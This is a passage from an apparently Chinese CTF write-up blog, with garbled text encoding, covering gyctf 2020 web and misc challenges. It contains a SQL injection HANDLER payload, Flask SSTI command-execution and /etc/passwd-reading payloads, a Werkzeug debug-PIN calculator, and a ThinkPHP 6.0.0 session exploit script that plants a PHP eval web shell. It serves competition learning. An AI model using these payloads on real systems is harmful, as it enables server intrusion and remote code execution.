class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="comment"># æˆ–è€…ç›´æ¥</span></span><br><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;</span><br></pre></td></tr></table></figure><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>çœ‹åå­—çŒœæµ‹æ˜¯å’Œsstiæ²™ç®±é€ƒé€¸ç›¸å…³å†…å®¹</p><h4 id="ä¸è¯»å–pinç "><a href="#ä¸è¯»å–pinç " class="headerlink" title="ä¸è¯»å–pinç "></a>ä¸è¯»å–pinç </h4><p>éšä¾¿è¾“ä¸€ä¸ªå­—ç¬¦è®©base64è§£å¯†æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°éƒ¨åˆ†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>ç®€å•çš„å°†ä¸€äº›å…³é”®å­—base64ç¼–ç åæäº¤å‘ç°çŸ¥è¯†ç®€å•çš„è¿‡æ»¤äº†å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">flag</span><br><span class="line">system</span><br><span class="line">popen</span><br><span class="line">import</span><br><span class="line">__import__</span><br><span class="line">importlib</span><br><span class="line">eval</span><br><span class="line">os</span><br><span class="line">subprocess</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹ä¸‹ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti%E7%9A%84exp">https://github.com/vulhub/vulhub/tree/master/flask/sstiçš„exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__(&quot;o&quot;+&quot;s&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;cat this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>å°†è¿‡æ»¤çš„ä¸œè¥¿æ‹¼æ¥åˆ°ä¸€å—å°±èƒ½æ‰§è¡Œå‘½ä»¤å¾—åˆ°flagäº†</p><h4 id="è¯»å–pinç "><a href="#è¯»å–pinç " class="headerlink" title="è¯»å–pinç "></a>è¯»å–pinç </h4><p>å…ˆä»‹ç»ä¸€ä¸‹pinç ï¼Œflaské¡¹ç›®è¿è¡Œæ—¶å¼€å¯debugæ¨¡å¼æ—¶ä¼šç”Ÿæˆä¸€ä¸ªç”±å½“å‰ç¯å¢ƒçš„pinç ï¼Œç±»ä¼¼äºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123-123-123</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´åœ¨æŸä¸ªç‰¹å®šç¯å¢ƒä¸‹pinç æ˜¯ä¸å˜çš„</p><p>è¾“å…¥æ­£ç¡®çš„pinç æˆ‘ä»¬å°±å¯ä»¥è¿›å…¥debugé¡µé¢ï¼Œç„¶åè¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿›å…¥pythonäº¤äº’å¼shell</p><p>å…³äºpinç è¯¦ç»†ä»‹ç»å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p><p>æˆ‘ä»¬éœ€è¦çŸ¥é“6ä¸ªå€¼ï¼š</p><ol><li><code>username</code>ï¼Œä¸ºå¯åŠ¨flaskçš„ç”¨æˆ·</li><li><code>modname</code>ï¼Œä¸ºflask.app</li><li><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code>ï¼Œä¸ºFlask</li><li><code>getattr(mod, &#39;__file__&#39;, None)</code>ï¼ŒflaskåŒ…ç›®å½•ä¸‹çš„app.pyçš„ç»å¯¹è·¯å¾„ï¼ŒæŠ¥é”™å¯ä»¥çˆ†å‡ºæ¥</li><li><code>uuid.getnode()</code> ï¼Œmacåœ°å€åè¿›åˆ¶</li><li><code>get_machine_id()</code>ï¼Œ/etc/machine-id</li></ol><p>çŸ¥é“è¿™6ä¸ªå€¼æˆ‘ä»¬å°±å¯ä»¥ç”¨å¤§ä½¬è„šæœ¬è·‘å‡ºæ¥pinç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;kingkk&#x27;</span>,<span class="comment"># username/etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),æŠ¥é”™å¯ä»¥çˆ†å‡ºæ¥</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-idæˆ–è€…/proc/self/cgroupæˆ–/proc/sys/kernel/random/boot_iæˆ–æ³¨å†Œè¡¨SOFTWARE\\Microsoft\\Cryptographyå€¼</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ä¸‹é¢çš„payloadè¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>ä»<code>/etc/passwd</code>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>flaskweb</code>çš„ç”¨æˆ·ï¼Œå°è¯•ç€ç”¨ä¸‹</p><p>è¯»å–<code>/proc/self/cgroup</code>ï¼Œæ³¨æ„åœ¨dockerç¯å¢ƒä¸­ä¸è¦è¯»<code>/etc/machine-id</code></p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200225121213.png" style="zoom:80%;"><p>è¯»å–<code>/sys/class/net/eth0/address</code>è·å¾—macåœ°å€<code>02:42:ac:12:00:04</code>ï¼Œåè¿›åˆ¶è¡¨è¾¾å¼æ˜¯<code>2485377957892</code></p><p>ä»æŠ¥é”™ä¸­çœ‹åˆ°å¯ä»¥çœ‹åˆ°ç»å¯¹è·¯å¾„ä¸º<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></p><p>å°†å¯¹åº”å†…å®¹å¡«å…¥è¿è¡Œå°±èƒ½å¾—åˆ°pin,æˆ‘è¿™é‡Œæ˜¯<code>922-522-604</code></p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200225122919.png" style="zoom:80%;"><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>è®¿é—®<code>www.zip</code>ï¼Œæœ‰æºç ï¼Œé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯thinkphp6.0.0æœ€æ–°çš„sessionçš„æ¼æ´</p><p>å‚è€ƒï¼š</p><p><a href="https://www.uedbox.com/post/65126/">https://www.uedbox.com/post/65126/</a></p><p><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a></p><p>æŠ¥é”™å¯ä»¥çœ‹å‡ºç‰ˆæœ¬ä¿¡æ¯</p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200225142134.png" style="zoom:80%;"><p>å…ˆä»‹ç»ä¸€ä¸‹TPæ¡†æ¶çš„è·¯ç”±è§„åˆ™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; index.php  &#x2F;Index    &#x2F;Index   &#x2F;index</span><br><span class="line">   å…¥å£æ–‡ä»¶   æ¨¡å—(å‰å°)  æ§åˆ¶å™¨    æ–¹æ³•</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜çš„åˆ©ç”¨æ–¹å¼ï¼š</p><ol><li>å…ˆæ­£å¸¸æ³¨å†Œä¸€ä¸ªè´¦å·</li><li>ç™»é™†æ—¶æŠ“åŒ…å°†sessidæ”¹æˆ<code>.php</code>ç»“å°¾ï¼Œé•¿åº¦å¿…é¡»æ˜¯32ä½</li><li>ç„¶åå»æœç´¢å¤„è¾“å…¥ä¸œè¥¿ï¼Œæ¥åˆ°ä¸ªäººä¸­å¿ƒçœ‹æœç´¢å†å²ï¼Œè¿™äº›æœç´¢å†å²éƒ½ä¿å­˜åœ¨<code>/runtime/session/</code>ç›®å½•å†…</li></ol><p>å†™äº†ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://182.92.243.154:7893/&#x27;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;moon&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;back&quot;</span>&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=1433223143322314332231433223.php&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">s.get(url)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">data</span>):</span></span><br><span class="line">s.post(url+<span class="string">&quot;home/member/register&quot;</span>,data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">data</span>):</span></span><br><span class="line">s.post(url+<span class="string">&#x27;home/member/login&#x27;</span>,data=data,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">data1=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>&#125;</span><br><span class="line">s.post(url+<span class="string">&#x27;home/member/search&#x27;</span>,data=data1,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">data2=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;echo &#x27;hacker!&#x27;;&quot;</span>&#125;</span><br><span class="line">r=requests.post(url+<span class="string">&quot;runtime/session/sess_1433223143322314332231433223.php&quot;</span>,data=data2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">&quot;[+] vulnerable!!!&quot;</span>)</span><br><span class="line">req()</span><br><span class="line">register(data)</span><br><span class="line">login(data)</span><br><span class="line">search()</span><br><span class="line">backdoor()</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘è¿ï¼Œå‘ç°æ²¡æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŸ¥çœ‹phpinfo()ï¼Œå‘ç°ï¼š</p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200225170417.png" style="zoom:80%;"><p>å¸¸è§„çš„bypassæ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œæœ‰ä¸ªé¡¹ç›®æ˜¯å…³äºphp7 bypass disable_functionçš„ï¼š</p><p><a href="https://github.com/mm0r1/exploits/">https://github.com/mm0r1/exploits/</a></p><p>è¿™é‡Œç”¨çš„å°±æ˜¯ï¼š</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code_in_morse"></a>code_in_morse</h3><p>æ–‡ä»¶æ˜¯æµé‡åŒ…ï¼Œwiresharkæ‰“å¼€ï¼Œå¯¼å‡ºæ‰€æœ‰httpå¯¹è±¡å‘ç°æœ‰ä¸ª<code>12.jpg</code>ï¼Œæ— æ³•æ˜¾ç¤º</p><p>hxdæ‰“å¼€å‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†çš„base32ï¼Œå†è§£å¯†å‘ç°å°±ä¹±ç äº†ä½†èƒ½çœ‹å‡ºæ¥æ˜¯pngæ–‡ä»¶</p><p>å†™äº†ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;12.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">s = a.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">dict = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..--..&#x27;</span>: <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-.&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--.-&#x27;</span>: <span class="string">&#x27;()&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....-&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.-.-&#x27;</span>: <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">tr=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> item <span class="keyword">in</span> dict:</span><br><span class="line">tr+=dict[item]</span><br><span class="line"><span class="comment"># print(tr)</span></span><br><span class="line"><span class="keyword">if</span> len(tr)%<span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">tr+=<span class="string">&#x27;=&#x27;</span>*(<span class="number">8</span>-len(tr)%<span class="number">8</span>)</span><br><span class="line">de=base64.b32decode(tr.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">fp.write(de)</span><br><span class="line"><span class="comment"># print(de)</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ç”Ÿæˆpngå›¾ç‰‡</p><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/1.png"></p><p>pdf417è§£å¯†ï¼Œè§£å¯†åœ°å€ï¼š<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;s2.ax1x.com&#x2F;2020&#x2F;02&#x2F;06&#x2F;1yPXJ1.jpg</span><br></pre></td></tr></table></figure><p>å¥—å¨ƒï¼Œä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹å±æ€§å‘ç°F5ï¼ŒçŒœæµ‹F5éšå†™ï¼Œæ²¡æƒ³åˆ°æ˜¯æ²¡å¯†ç çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 1yPXJ1.jpg</span><br></pre></td></tr></table></figure><p>åœ¨<code>output.txt</code>é‡Œæ‰¾åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ—¥å¿—åˆ†æ</title>
      <link href="2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
